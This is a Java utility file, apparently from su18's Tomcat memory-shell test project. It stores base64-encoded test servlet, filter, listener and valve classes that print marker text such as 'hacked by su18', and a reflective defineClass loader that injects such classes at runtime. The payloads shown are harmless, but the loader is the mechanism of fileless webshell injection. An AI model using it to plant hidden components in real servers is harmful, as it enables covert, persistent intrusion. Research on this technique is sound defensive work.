package com.filter;

import sun.misc.BASE64Decoder;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

/**
 * @author su18
 */
public class DynamicUtils {

	public static String SERVLET_CLASS_STRING = "yv66vgAAADQANAoABgAjCwAkACUIACYKACcAKAcAKQcAKgcAKwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQArTG9yZy9zdTE4L21lbXNoZWxsL3Rlc3QvdG9tY2F0L1Rlc3RTZXJ2bGV0OwEABGluaXQBACAoTGphdmF4L3NlcnZsZXQvU2VydmxldENvbmZpZzspVgEADXNlcnZsZXRDb25maWcBAB1MamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEACkV4Y2VwdGlvbnMHACwBABBnZXRTZXJ2bGV0Q29uZmlnAQAfKClMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEAB3NlcnZpY2UBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7BwAtAQAOZ2V0U2VydmxldEluZm8BABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAQVGVzdFNlcnZsZXQuamF2YQwACAAJBwAuDAAvADABAARzdTE4BwAxDAAyADMBAClvcmcvc3UxOC9tZW1zaGVsbC90ZXN0L3RvbWNhdC9UZXN0U2VydmxldAEAEGphdmEvbGFuZy9PYmplY3QBABVqYXZheC9zZXJ2bGV0L1NlcnZsZXQBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAEABwAAAAYAAQAIAAkAAQAKAAAALwABAAEAAAAFKrcAAbEAAAACAAsAAAAGAAEAAAAJAAwAAAAMAAEAAAAFAA0ADgAAAAEADwAQAAIACgAAADUAAAACAAAAAbEAAAACAAsAAAAGAAEAAAAOAAwAAAAWAAIAAAABAA0ADgAAAAAAAQARABIAAQATAAAABAABABQAAQAVABYAAQAKAAAALAABAAEAAAACAbAAAAACAAsAAAAGAAEAAAASAAwAAAAMAAEAAAACAA0ADgAAAAEAFwAYAAIACgAAAE4AAgADAAAADCy5AAIBABIDtgAEsQAAAAIACwAAAAoAAgAAABcACwAYAAwAAAAgAAMAAAAMAA0ADgAAAAAADAAZABoAAQAAAAwAGwAcAAIAEwAAAAYAAgAUAB0AAQAeAB8AAQAKAAAALAABAAEAAAACAbAAAAACAAsAAAAGAAEAAAAcAAwAAAAMAAEAAAACAA0ADgAAAAEAIAAJAAEACgAAACsAAAABAAAAAbEAAAACAAsAAAAGAAEAAAAiAAwAAAAMAAEAAAABAA0ADgAAAAEAIQAAAAIAIg==";

	public static String FILTER_CLASS_STRING = "yv66vgAAADQANwoABwAiCwAjACQIACUKACYAJwsAKAApBwAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACpMb3JnL3N1MTgvbWVtc2hlbGwvdGVzdC90b21jYXQvVGVzdEZpbHRlcjsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEACkV4Y2VwdGlvbnMHAC0HAC4BAAdkZXN0cm95AQAKU291cmNlRmlsZQEAD1Rlc3RGaWx0ZXIuamF2YQwACQAKBwAvDAAwADEBAA90aGlzIGlzIEZpbHRlciAHADIMADMANAcANQwAFAA2AQAob3JnL3N1MTgvbWVtc2hlbGwvdGVzdC90b21jYXQvVGVzdEZpbHRlcgEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgAhAAYABwABAAgAAAAEAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAACQANAAAADAABAAAABQAOAA8AAAABABAAEQABAAsAAAA1AAAAAgAAAAGxAAAAAgAMAAAABgABAAAAEgANAAAAFgACAAAAAQAOAA8AAAAAAAEAEgATAAEAAQAUABUAAgALAAAAZAADAAQAAAAULLkAAgEAEgO2AAQtKyy5AAUDALEAAAACAAwAAAAOAAMAAAAfAAsAIQATACIADQAAACoABAAAABQADgAPAAAAAAAUABYAFwABAAAAFAAYABkAAgAAABQAGgAbAAMAHAAAAAYAAgAdAB4AAQAfAAoAAQALAAAAKwAAAAEAAAABsQAAAAIADAAAAAYAAQAAACkADQAAAAwAAQAAAAEADgAPAAAAAQAgAAAAAgAh";

	public static String LISTENER_CLASS_STRING = "yv66vgAAADQAVwoAEQArCgAsAC0HAC4KABEALwgAHAoAMAAxCgAyADMKADIANAcANQoACQA2CgA3ADgIADkKADoAOwcAPAoADgA9BwA+BwA/BwBAAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACxMb3JnL3N1MTgvbWVtc2hlbGwvdGVzdC90b21jYXQvVGVzdExpc3RlbmVyOwEAEHJlcXVlc3REZXN0cm95ZWQBACYoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDspVgEAB3JlcXVlc3QBAC1Mb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdEZhY2FkZTsBAAFmAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAA3JlcQEAJ0xvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0OwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABNzZXJ2bGV0UmVxdWVzdEV2ZW50AQAjTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDsBAA1TdGFja01hcFRhYmxlBwA8AQAScmVxdWVzdEluaXRpYWxpemVkAQAKU291cmNlRmlsZQEAEVRlc3RMaXN0ZW5lci5qYXZhDAATABQHAEEMAEIAQwEAK29yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1JlcXVlc3RGYWNhZGUMAEQARQcARgwARwBIBwBJDABKAEsMAEwATQEAJW9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1JlcXVlc3QMAE4ATwcAUAwAUQBSAQAPCmhhY2tlZCBieSBzdTE4BwBTDABUAFUBABNqYXZhL2xhbmcvRXhjZXB0aW9uDABWABQBACpvcmcvc3UxOC9tZW1zaGVsbC90ZXN0L3RvbWNhdC9UZXN0TGlzdGVuZXIBABBqYXZhL2xhbmcvT2JqZWN0AQAkamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdExpc3RlbmVyAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50AQARZ2V0U2VydmxldFJlcXVlc3QBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAD2phdmEvbGFuZy9DbGFzcwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAtnZXRSZXNwb25zZQEAKigpTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOwEAJm9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAD3ByaW50U3RhY2tUcmFjZQAhABAAEQABABIAAAADAAEAEwAUAAEAFQAAAC8AAQABAAAABSq3AAGxAAAAAgAWAAAABgABAAAADQAXAAAADAABAAAABQAYABkAAAABABoAGwABABUAAADIAAIABQAAADcrtgACwAADTSy2AAQSBbYABk4tBLYABy0stgAIwAAJOgQZBLYACrYACxIMtgANpwAITSy2AA+xAAEAAAAuADEADgADABYAAAAmAAkAAAAXAAgAGAASABkAFwAaACEAHAAuACAAMQAeADIAHwA2ACMAFwAAAD4ABgAIACYAHAAdAAIAEgAcAB4AHwADACEADQAgACEABAAyAAQAIgAjAAIAAAA3ABgAGQAAAAAANwAkACUAAQAmAAAABwACcQcAJwQAAQAoABsAAQAVAAAANQAAAAIAAAABsQAAAAIAFgAAAAYAAQAAACwAFwAAABYAAgAAAAEAGAAZAAAAAAABACQAJQABAAEAKQAAAAIAKg==";

	public static String VALVE_CLASS_STRING = "yv66vgAAADQAMQoACAAbCgAcAB0IAB4KAB8AIAoABwAhCwAiACMHACQHACUBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAKUxvcmcvc3UxOC9tZW1zaGVsbC90ZXN0L3RvbWNhdC9UZXN0VmFsdmU7AQAGaW52b2tlAQBSKExvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0O0xvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZTspVgEAB3JlcXVlc3QBACdMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdDsBAAhyZXNwb25zZQEAKExvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZTsBAApFeGNlcHRpb25zBwAmBwAnAQAKU291cmNlRmlsZQEADlRlc3RWYWx2ZS5qYXZhDAAJAAoHACgMACkAKgEAEkkgY29tZSBoZXJlIGZpcnN0IQcAKwwALAAtDAAuAC8HADAMABAAEQEAJ29yZy9zdTE4L21lbXNoZWxsL3Rlc3QvdG9tY2F0L1Rlc3RWYWx2ZQEAJG9yZy9hcGFjaGUvY2F0YWxpbmEvdmFsdmVzL1ZhbHZlQmFzZQEAE2phdmEvaW8vSU9FeGNlcHRpb24BAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BACZvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAdnZXROZXh0AQAdKClMb3JnL2FwYWNoZS9jYXRhbGluYS9WYWx2ZTsBABlvcmcvYXBhY2hlL2NhdGFsaW5hL1ZhbHZlACEABwAIAAAAAAACAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAADQANAAAADAABAAAABQAOAA8AAAABABAAEQACAAsAAABbAAMAAwAAABUstgACEgO2AAQqtgAFKyy5AAYDALEAAAACAAwAAAAOAAMAAAARAAkAEwAUABQADQAAACAAAwAAABUADgAPAAAAAAAVABIAEwABAAAAFQAUABUAAgAWAAAABgACABcAGAABABkAAAACABo=";


	public static Class<?> getClass(String classCode) throws IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, InstantiationException {
		ClassLoader   loader        = Thread.currentThread().getContextClassLoader();
		BASE64Decoder base64Decoder = new BASE64Decoder();
		byte[]        bytes         = base64Decoder.decodeBuffer(classCode);

		Method   method = null;
		Class<?> clz    = loader.getClass();
		while (method == null && clz != Object.class) {
			try {
				method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
			} catch (NoSuchMethodException ex) {
				clz = clz.getSuperclass();
			}
		}

		if (method != null) {
			method.setAccessible(true);
			return (Class<?>) method.invoke(loader, bytes, 0, bytes.length);
		}

		return null;

	}
}
